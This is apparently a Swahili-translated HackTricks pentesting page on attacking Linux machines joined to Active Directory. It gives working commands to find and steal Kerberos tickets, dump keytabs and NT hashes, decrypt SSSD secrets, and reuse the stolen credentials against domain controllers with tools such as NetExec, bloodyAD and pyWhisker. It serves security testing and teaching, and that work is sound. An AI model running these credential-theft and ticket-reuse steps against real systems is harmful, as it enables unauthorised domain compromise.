# Active Directory ya Linux

{{#include ../../banners/hacktricks-training.md}}

Mashine ya linux pia inaweza kuwepo ndani ya mazingira ya Active Directory.

Mashine ya Linux iliyo ndani ya AD inaweza **kuhifadhi Kerberos material locally**: user ccaches, machine/service keytabs, na secrets zinazosimamiwa na SSSD. Artefacts hizi kwa kawaida zinaweza kutumika tena kama Kerberos credential nyingine yoyote. Ili kusoma nyingi kati ya hizi, utahitaji kuwa user owner wa ticket au **root** kwenye mashine.

## Enumeration

### AD enumeration kutoka linux

Ikiwa una access kwenye AD kupitia linux (au bash kwenye Windows), unaweza kujaribu [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) kufanya enumeration ya AD.

Unaweza pia kuangalia ukurasa ufuatao ili kujifunza **njia nyingine za kufanya enumeration ya AD kutoka linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ni **alternative** ya open-source kwa Microsoft Windows **Active Directory**, hasa kwa mazingira ya **Unix**. Inachanganya **LDAP directory** kamili na MIT **Kerberos** Key Distribution Center kwa usimamizi unaofanana na Active Directory. Kwa kutumia Dogtag **Certificate System** kwa usimamizi wa CA & RA certificate, inasaidia authentication ya **multi-factor**, ikiwemo smartcards. SSSD imeunganishwa kwa michakato ya Unix authentication. Jifunze zaidi kuihusu katika:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefacts za host iliyojiunga na domain

Kabla ya kugusa tickets, tambua **jinsi host ilivyojiunga na AD** na **mahali Kerberos material ilipo kwa hakika**. Kwenye hosts za kisasa za Linux, hii kwa kawaida hushughulikiwa na `realmd` + `adcli` + `sssd`, wala si files tambarare tu ndani ya `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Hii inakuonyesha haraka ikiwa host inaamini AD, ikiwa SSSD inahifadhi identities au tickets kwenye cache, na ikiwa **machine/service keytabs** au **KCM secrets** zinapatikana kwa matumizi mabaya.

## Kucheza na tickets

### Pass The Ticket

Katika ukurasa huu utapata maeneo mbalimbali ambapo unaweza **kupata Kerberos tickets ndani ya Linux host**. Katika ukurasa ufuatao unaweza kujifunza jinsi ya kubadilisha formats hizi za CCache kuwa Kirbi (format unayohitaji kutumia kwenye Windows), na pia jinsi ya kufanya attack ya PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Ikiwa unataka **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, n.k.), angalia ukurasa maalum:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Kutumia tena CCACHE tickets kutoka /tmp

CCACHE files ni binary formats za **kuhifadhi Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` bado inatumika kwa kawaida, lakini Linux deployments za kisasa pia hutumia `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, au `KCM:%{uid}`. Kagua environment variable ya **`KRB5CCNAME`** na setting ya `default_ccache_name` kabla ya kudhani kuwa tickets ziko kwenye `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Kerberos tickets zilizohifadhiwa kwenye memory ya process zinaweza kutolewa**, hasa wakati ptrace protection ya machine imezimwa (`/proc/sys/kernel/yama/ptrace_scope`). Tool muhimu kwa madhumuni haya inapatikana kwenye [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), ambayo hurahisisha extraction kwa kuingiza code kwenye sessions na kudump tickets kwenye `/tmp`.

Ili kusanidi na kutumia tool hii, hatua zilizo hapa chini hufuatwa:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Utaratibu huu utajaribu kuingiza kwenye sessions mbalimbali, na kuonyesha mafanikio kwa kuhifadhi tickets zilizotolewa katika `/tmp` kwa naming convention ya `__krb_UID.ccache`.

### Kutumia tena CCACHE ticket kutoka SSSD KCM

SSSD huhifadhi nakala ya database katika path `/var/lib/sss/secrets/secrets.ldb`. Key inayolingana huhifadhiwa kama hidden file katika path `/var/lib/sss/secrets/.secrets.mkey`. Kwa chaguo-msingi, key inaweza kusomwa tu ikiwa una permissions za **root**.

Kuita **`SSSDKCMExtractor`** kwa kutumia parameters --database na --key kutaparsing database na **kudecrypt secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob inaweza kubadilishwa kuwa faili ya Kerberos CCache inayoweza kutumika, ambayo inaweza kupelekwa kwa Mimikatz/Rubeus.**

### Triage ya haraka ya keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Toa akaunti kutoka /etc/krb5.keytab

Vifunguo vya akaunti za huduma, ambavyo ni muhimu kwa huduma zinazofanya kazi kwa haki za root, huhifadhiwa kwa usalama katika faili za **`/etc/krb5.keytab`**. Vifunguo hivi, vinavyofanana na nywila za huduma, vinahitaji usiri mkali.

Ili kukagua yaliyomo kwenye faili la keytab, **`klist`** inaweza kutumika. Kwenye Linux, `klist -k -K -e` huonyesha principals, nambari za matoleo ya funguo, aina za usimbaji fiche, na key material ghafi. Ikiwa aina ya ufunguo ni **23 / RC4-HMAC**, thamani ya ufunguo pia ni **NT hash** ya principal huyo.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Kwa watumiaji wa Linux, **`KeyTabExtract`** hutoa utendaji wa kutoa hash ya RC4 HMAC, ambayo inaweza kutumika kwa reuse ya NTLM hash. Kumbuka kwamba hii husaidia tu wakati keytab bado ina nyenzo za **etype 23 / RC4-HMAC**. Katika mazingira ya **AES-only**, huenda usipate NT hash inayoweza kutumika tena, lakini bado unaweza ku-authenticate moja kwa moja ukitumia keytab kupitia Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Kwenye macOS, **`bifrost`** hutumika kama zana ya kuchanganua faili za keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Kwa kutumia taarifa za akaunti na hash zilizotolewa, miunganisho kwenye servers inaweza kuanzishwa kwa kutumia tools kama **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Tumia tena machine account kutoka `/etc/krb5.keytab`

Kwenye mifumo iliyounganishwa kwa `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` kwa kawaida huwa na **computer account** na **host/service principals** moja au zaidi. Ikiwa una **root**, usiifanye dump tu: tumia mojawapo ya principals zilizoorodheshwa na `klist -k` kuomba TGT na kufanya kazi kama Linux host yenyewe.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Hii ni muhimu hasa wakati **computer object** yenyewe imepewa delegated rights katika AD au host inaruhusiwa kupata secrets nyingine kama **gMSA**.

### Tumia tena Kerberos material iliyoibiwa kwa kutumia Linux-first AD tooling

Mara tu unapokuwa na `ccache` halali au keytab inayoweza kutumika, unaweza kuendesha operesheni dhidi ya AD **moja kwa moja kutoka Linux** bila kubadilisha kila kitu kwanza kuwa Windows formats. Zana nyingi za kisasa zinakubali `KRB5CCNAME` / Kerberos auth natively:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Hii ni daraja zuri kati ya **Linux post-exploitation** na **AD object abuse**. Kwa njia zenyewe za object-level abuse, angalia:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Linux deployments za hivi karibuni zinaweza kutumia **Managed Service Accounts** moja kwa moja kutoka AD. Kwa vitendo, hii inamaanisha kwamba baada ya ku-compromise Linux server, unaweza kupata si tu host keytab bali pia **service-specific keytabs** zilizotengenezwa kutoka kwa gMSA. Maeneo ya kawaida ya kukagua ni `/etc/gmsad.conf`, deployment-specific config files, na faili za ziada za `*.keytab` ndani ya `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Hii inakupa utambulisho wa Kerberos unaoweza kutumika tena kwa SPN zilizofungamanishwa na gMSA **bila kugusa endpoint yoyote ya Windows**. Kwa matumizi mabaya ya gMSA/dMSA ya **domain-side** baada ya kupata privileges za juu katika AD, angalia:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Marejeleo

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
